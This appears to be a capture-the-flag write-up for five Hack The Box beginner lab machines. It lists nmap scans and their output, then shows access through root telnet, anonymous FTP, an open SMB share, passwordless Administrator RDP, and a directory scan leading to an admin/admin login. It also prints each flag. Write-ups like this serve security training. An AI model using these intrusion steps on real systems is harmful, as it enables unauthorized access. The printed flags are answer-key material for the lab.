# HTB-Tier-0-CTF

## STARTING POINT Tier 0 Machines 

https://app.hackthebox.com/starting-point

# Meow

**Use nmap to scan for open ports : sudo nmap -sS 10.129.115.157** 

	23/tcp open  telnet

telnet to machine with username root

ls and cat flag.txt to get the flag

###### 🏴‍☠️ HTB{b40abdfe23665f766f9c61ecba8a4c19}

 
# Fawn 

**Use nmap to scan for open ports : sudo nmap -sS -sV 10.129.115.194**

	21/tcp open  ftp     vsftpd 3.0.3
	Service Info: OS: Unix

Login via FTP using anonymous user

GET and cat flag.txt for flag

 ###### 🏴‍☠️ HTB{035db21c881520061c53e0536e44f815} 
 

# Dancing 

**Use nmap to scan for open ports : sudo nmap -sS -sV 10.129.115.201**

	PORT    STATE SERVICE       VERSION
	135/tcp open  msrpc         Microsoft Windows RPC

	139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn

	445/tcp open  microsoft-ds?

	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

**Use smbclient too and found some workshare directory** 

Gain access to smbclient shell smbclient \\\\10.129.115.201\\WorkShares

explore the directories and get the flag.txt

###### 🏴‍☠️ HTB{5f61c10dffbc77a704d76016a22f1664} 

 
# Explosion 

**Use nmap to scan for open ports : sudo nmap -sS -sV 10.129.116.6** 

	PORT     STATE SERVICE       VERSION

	135/tcp  open  msrpc         Microsoft Windows RPC

	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn

	445/tcp  open  microsoft-ds?

	3389/tcp open  ms-wbt-server Microsoft Terminal Services

	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

**Use the xfreerdp to gain remote desktop access to the box : xfreerdp /v:10.129.116.6 /cert:ignore /u:Administrator** 

open flag.txt to get the flag

###### 🏴‍☠️ HTB{951fa96d7830c451b536be5a6be008a0} 


# Preignition

**Use nmap to scan for open ports: Sudo nmap -sS -sV 10.129.115.242**

	PORT   STATE SERVICE VERSION

	80/tcp open  http    nginx 1.14.2

**Use gobuster dir -u http://10.129.115.242 -w /usr/share/wordlists/dirb/common.txt** 

	/admin.php            (Status: 200) [Size: 999]

Head to 10.129.115.242/admin.php and a login account will appear 

**Use basic creditionals like Username : admin and password : admin** 

Found a flag!

###### 🏴‍☠️ HTB{6483bee07c1c1d57f14e5b0717503c73}





